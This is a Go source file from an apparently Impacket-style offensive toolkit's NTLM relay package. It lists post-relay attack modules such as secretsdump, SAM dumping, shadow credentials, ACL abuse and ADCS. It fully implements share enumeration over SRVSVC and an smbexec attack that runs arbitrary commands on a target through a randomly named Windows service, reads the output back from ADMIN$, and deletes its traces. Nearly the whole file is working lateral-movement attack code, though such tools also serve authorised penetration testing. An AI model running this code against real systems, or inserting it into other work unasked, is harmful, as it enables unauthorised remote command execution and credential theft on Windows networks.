// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package relay

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"strings"
	"time"
	"unicode/utf16"

	"github.com/mandiant/gopacket/pkg/dcerpc"
	"github.com/mandiant/gopacket/pkg/dcerpc/svcctl"
)

// getAttackModule returns the attack module for the given name.
func getAttackModule(name string) AttackModule {
	switch name {
	// SMB attacks
	case "shares":
		return &SharesAttack{}
	case "smbexec":
		return &SMBExecAttack{}
	case "samdump":
		return &SAMDumpAttack{}
	case "secretsdump":
		return &SecretsdumpAttack{}
	case "tschexec":
		return &TschExecAttack{}
	case "enumlocaladmins":
		return &EnumLocalAdminsAttack{}
	// LDAP attacks
	case "ldapdump":
		return &LDAPDumpAttack{}
	case "delegate":
		return &DelegateAttack{}
	case "aclabuse":
		return &ACLAbuseAttack{}
	case "addcomputer":
		return &AddComputerAttack{}
	case "shadowcreds":
		return &ShadowCredsAttack{}
	case "laps":
		return &LAPSDumpAttack{}
	case "gmsa":
		return &GMSADumpAttack{}
	case "adddns":
		return &DNSRecordAttack{}
	// MSSQL attacks
	case "mssqlquery":
		return &MSSQLQueryAttack{}
	// HTTP attacks
	case "adcs":
		return &ADCSAttack{}
	// WinRM attacks
	case "winrmexec":
		return &WinRMExecAttack{}
	// RPC attacks
	case "rpctschexec":
		return &RPCTschExecAttack{}
	case "icpr":
		return &RPCICPRAttack{}
	default:
		return nil
	}
}

// SharesAttack enumerates shares on the target via SRVSVC.
type SharesAttack struct{}

func (a *SharesAttack) Name() string { return "shares" }

func (a *SharesAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*SMBRelayClient)
	if !ok {
		return fmt.Errorf("shares attack requires SMB session")
	}
	return sharesAttack(client, config)
}

// SMBExecAttack executes a command on the target via service creation.
type SMBExecAttack struct{}

func (a *SMBExecAttack) Name() string { return "smbexec" }

func (a *SMBExecAttack) Run(session interface{}, config *Config) error {
	client, ok := session.(*SMBRelayClient)
	if !ok {
		return fmt.Errorf("smbexec attack requires SMB session")
	}
	return smbExecAttack(client, config)
}

// SRVSVC UUID and constants
var srvsvcUUID = [16]byte{
	0xc8, 0x4f, 0x32, 0x4b, 0x70, 0x16, 0xd3, 0x01,
	0x12, 0x78, 0x5a, 0x47, 0xbf, 0x6e, 0xe1, 0x88,
}

const (
	srvsvcMajorVersion = 3
	srvsvcMinorVersion = 0
	opNetShareEnumAll  = 15
)

// sharesAttack enumerates shares on the target via SRVSVC
func sharesAttack(client *SMBRelayClient, cfg *Config) error {
	log.Printf("[*] Enumerating shares on %s...", cfg.TargetAddr)

	// Connect to IPC$ and open srvsvc pipe
	if err := client.TreeConnect("IPC$"); err != nil {
		return fmt.Errorf("tree connect IPC$: %v", err)
	}

	fileID, err := client.CreatePipe("srvsvc")
	if err != nil {
		return fmt.Errorf("open srvsvc pipe: %v", err)
	}
	defer client.ClosePipe(fileID)

	// Create DCERPC client over relay pipe
	transport := NewRelayPipeTransport(client, fileID)
	rpcClient := &dcerpc.Client{
		Transport: transport,
		CallID:    1,
		MaxFrag:   dcerpc.GetWindowsMaxFrag(),
		Contexts:  make(map[[16]byte]uint16),
	}

	// Bind to SRVSVC
	if err := rpcClient.Bind(srvsvcUUID, srvsvcMajorVersion, srvsvcMinorVersion); err != nil {
		return fmt.Errorf("bind srvsvc: %v", err)
	}

	// Call NetShareEnumAll (OpNum 15)
	shares, err := netShareEnumAll(rpcClient)
	if err != nil {
		return fmt.Errorf("NetShareEnumAll: %v", err)
	}

	log.Printf("[+] Found %d shares:", len(shares))
	for _, s := range shares {
		log.Printf("    %-20s %s", s.Name, s.Comment)
	}

	return nil
}

type shareInfo struct {
	Name    string
	Type    uint32
	Comment string
}

// netShareEnumAll calls NetShareEnumAll via SRVSVC
func netShareEnumAll(client *dcerpc.Client) ([]shareInfo, error) {
	buf := new(bytes.Buffer)

	// ServerName (pointer + conformant string)
	binary.Write(buf, binary.LittleEndian, uint32(0x20000)) // Ptr
	serverName := utf16.Encode([]rune("\\\\*"))
	serverName = append(serverName, 0)
	count := uint32(len(serverName))
	binary.Write(buf, binary.LittleEndian, count)     // MaxCount
	binary.Write(buf, binary.LittleEndian, uint32(0)) // Offset
	binary.Write(buf, binary.LittleEndian, count)     // ActualCount
	for _, c := range serverName {
		binary.Write(buf, binary.LittleEndian, c)
	}
	// Pad to 4 bytes
	if (len(serverName)*2)%4 != 0 {
		buf.Write(make([]byte, 4-(len(serverName)*2)%4))
	}

	// InfoStruct (SHARE_ENUM_STRUCT)
	binary.Write(buf, binary.LittleEndian, uint32(1)) // Level = 1

	// ShareInfo union (level 1)
	binary.Write(buf, binary.LittleEndian, uint32(1))       // Switch value = 1
	binary.Write(buf, binary.LittleEndian, uint32(0x20004)) // Referent ID for SHARE_INFO_1_CONTAINER*

	// SHARE_INFO_1_CONTAINER (deferred pointer target)
	binary.Write(buf, binary.LittleEndian, uint32(0)) // EntriesRead = 0
	binary.Write(buf, binary.LittleEndian, uint32(0)) // Buffer ptr = NULL

	// PreferedMaximumLength
	binary.Write(buf, binary.LittleEndian, uint32(0xFFFFFFFF)) // -1 = max

	// ResumeHandle (pointer)
	binary.Write(buf, binary.LittleEndian, uint32(0x20000)) // Ptr
	binary.Write(buf, binary.LittleEndian, uint32(0))       // Value = 0

	resp, err := client.Call(opNetShareEnumAll, buf.Bytes())
	if err != nil {
		return nil, err
	}

	return parseNetShareEnumResponse(resp)
}

// parseNetShareEnumResponse parses the NDR response from NetShareEnumAll
func parseNetShareEnumResponse(resp []byte) ([]shareInfo, error) {
	if len(resp) < 20 {
		return nil, fmt.Errorf("response too short: %d bytes", len(resp))
	}

	r := bytes.NewReader(resp)

	// Level (4 bytes)
	var level uint32
	binary.Read(r, binary.LittleEndian, &level)

	// Switch value (4 bytes)
	var switchVal uint32
	binary.Read(r, binary.LittleEndian, &switchVal)

	// Referent ID for SHARE_INFO_1_CONTAINER* (pointer in union)
	var containerRef uint32
	binary.Read(r, binary.LittleEndian, &containerRef)

	// SHARE_INFO_1_CONTAINER
	var entriesRead uint32
	binary.Read(r, binary.LittleEndian, &entriesRead)

	// Buffer pointer
	var bufPtr uint32
	binary.Read(r, binary.LittleEndian, &bufPtr)

	if bufPtr == 0 || entriesRead == 0 {
		return nil, nil
	}

	// Array MaxCount
	var maxCount uint32
	binary.Read(r, binary.LittleEndian, &maxCount)

	// Read SHARE_INFO_1 entries (pointer-based: name_ptr(4) + type(4) + comment_ptr(4) each)
	type shareEntry struct {
		NamePtr    uint32
		ShareType  uint32
		CommentPtr uint32
	}

	entries := make([]shareEntry, entriesRead)
	for i := uint32(0); i < entriesRead; i++ {
		binary.Read(r, binary.LittleEndian, &entries[i].NamePtr)
		binary.Read(r, binary.LittleEndian, &entries[i].ShareType)
		binary.Read(r, binary.LittleEndian, &entries[i].CommentPtr)
	}

	// Now read the deferred strings
	shares := make([]shareInfo, 0, entriesRead)
	for i := uint32(0); i < entriesRead; i++ {
		name := ""
		comment := ""

		if entries[i].NamePtr != 0 {
			name = readNDRString(r)
		}
		if entries[i].CommentPtr != 0 {
			comment = readNDRString(r)
		}

		shares = append(shares, shareInfo{
			Name:    name,
			Type:    entries[i].ShareType,
			Comment: comment,
		})
	}

	return shares, nil
}

func readNDRString(r *bytes.Reader) string {
	var maxCount, offset, actualCount uint32
	binary.Read(r, binary.LittleEndian, &maxCount)
	binary.Read(r, binary.LittleEndian, &offset)
	binary.Read(r, binary.LittleEndian, &actualCount)

	chars := make([]uint16, actualCount)
	binary.Read(r, binary.LittleEndian, &chars)

	// Pad to 4-byte boundary
	bytesRead := actualCount * 2
	if bytesRead%4 != 0 {
		pad := 4 - (bytesRead % 4)
		r.Seek(int64(pad), 1)
	}

	// Trim null terminator
	if len(chars) > 0 && chars[len(chars)-1] == 0 {
		chars = chars[:len(chars)-1]
	}

	return string(utf16.Decode(chars))
}

// smbExecAttack executes a command on the target via service creation
func smbExecAttack(client *SMBRelayClient, cfg *Config) (err error) {
	if cfg.Command == "" {
		return fmt.Errorf("no command specified (-c flag)")
	}

	// Buffered run log, flushed on every exit (success or failure) so failed
	// attempts also leave a traceable `smbexec_<host>.txt` for manual review.
	host := hostFromAddr(client.TargetAddr)
	rl := &runLog{}
	defer func() { rl.Flush(cfg, host, "smbexec", cfg.Command, err) }()

	// Connect to IPC$ and open svcctl pipe
	if err := client.TreeConnect("IPC$"); err != nil {
		return fmt.Errorf("tree connect IPC$: %v", err)
	}

	fileID, err := client.CreatePipe("svcctl")
	if err != nil {
		return fmt.Errorf("open svcctl pipe: %v", err)
	}
	defer client.ClosePipe(fileID)

	// Create DCERPC client over relay pipe
	transport := NewRelayPipeTransport(client, fileID)
	rpcClient := &dcerpc.Client{
		Transport: transport,
		CallID:    1,
		MaxFrag:   dcerpc.GetWindowsMaxFrag(),
		Contexts:  make(map[[16]byte]uint16),
	}

	// Bind to SVCCTL
	if err := rpcClient.Bind(svcctl.UUID, svcctl.MajorVersion, svcctl.MinorVersion); err != nil {
		return fmt.Errorf("bind svcctl: %v", err)
	}

	// Create service controller
	sc, err := svcctl.NewServiceController(rpcClient)
	if err != nil {
		return fmt.Errorf("open SCManager: %v", err)
	}
	defer sc.Close()

	// Random names (no tool-identifying prefix). The command's output goes to a
	// target temp file terminated by a completion marker; finding the marker on
	// read-back proves the command ran to completion (Impacket-style verify).
	serviceName := randomName()
	outFile := randomName() + ".tmp"
	remoteOut := "Temp\\" + outFile // relative to ADMIN$ (= %SystemRoot%)

	rl.Printf("[*] Executing command on %s via service creation...", cfg.TargetAddr)

	binaryPath := fmt.Sprintf("%%COMSPEC%% /C %s > %%SystemRoot%%\\%s 2>&1 & echo %s >> %%SystemRoot%%\\%s",
		cfg.Command, remoteOut, cmdDoneMarker, remoteOut)

	rl.Printf("[*] Creating service %s...", serviceName)

	// Create service
	svcHandle, err := sc.CreateService(
		serviceName,
		serviceName,
		binaryPath,
		svcctl.SERVICE_WIN32_OWN_PROCESS,
		svcctl.SERVICE_DEMAND_START,
		svcctl.ERROR_IGNORE,
	)
	if err != nil {
		return fmt.Errorf("create service: %v", err)
	}

	rl.Printf("[*] Starting service %s...", serviceName)

	// Start service: SCM reports a timeout for cmd.exe services even when the
	// command runs, so the output read-back below decides success.
	if err := sc.StartService(svcHandle); err != nil {
		rl.Printf("[*] Service start returned: %v (expected for cmd.exe services)", err)
	}

	// Poll for the output file until the completion marker appears (the file is
	// created at command start, so existence alone does not mean it finished).
	wait := cfg.CmdTimeout
	if wait <= 0 {
		wait = 10 * time.Second
	}
	deadline := time.Now().Add(wait)
	var output []byte
	found := false
	for time.Now().Before(deadline) {
		time.Sleep(500 * time.Millisecond)
		data, derr := client.DownloadFile("ADMIN$", remoteOut)
		if derr != nil {
			continue
		}
		if strings.Contains(string(data), cmdDoneMarker) {
			output = data
			found = true
			break
		}
	}

	rl.Printf("[*] Deleting service %s...", serviceName)

	// Close the create handle and re-open by name for delete. The relay session
	// may lose access on the original handle after start, so retry a few times.
	sc.CloseServiceHandle(svcHandle)

	var delErr error
	for attempt := 0; attempt < 3; attempt++ {
		dh, oerr := sc.OpenService(serviceName, svcctl.SERVICE_ALL_ACCESS)
		if oerr != nil {
			delErr = oerr
			time.Sleep(500 * time.Millisecond)
			continue
		}
		delErr = sc.DeleteService(dh)
		sc.CloseServiceHandle(dh)
		if delErr == nil {
			break
		}
		time.Sleep(500 * time.Millisecond)
	}
	if delErr != nil {
		rl.Printf("[-] Service %s could not be deleted after retries (%v) — it may still exist on the target", serviceName, delErr)
	}

	// Always best-effort remove the temp output file, success or not.
	if derr := client.DeleteFile("ADMIN$", remoteOut); derr != nil {
		if found {
			rl.Printf("[-] Warning: could not delete %s on target: %v", remoteOut, derr)
		} else {
			verboseLog("[-] Best-effort delete of %s failed: %v", remoteOut, derr)
		}
	}

	if !found {
		rl.Printf("[-] No completed output from target (%s) — command did not execute (no file or missing %s marker)", remoteOut, cmdDoneMarker)
		return fmt.Errorf("command did not execute on %s (no completion marker in %s)", cfg.TargetAddr, remoteOut)
	}

	text := strings.TrimSpace(strings.ReplaceAll(string(output), cmdDoneMarker, ""))
	if text != "" {
		rl.Printf("[+] Command output:\n%s", text)
	} else {
		rl.Printf("[*] Command executed (no output)")
	}

	return nil
}
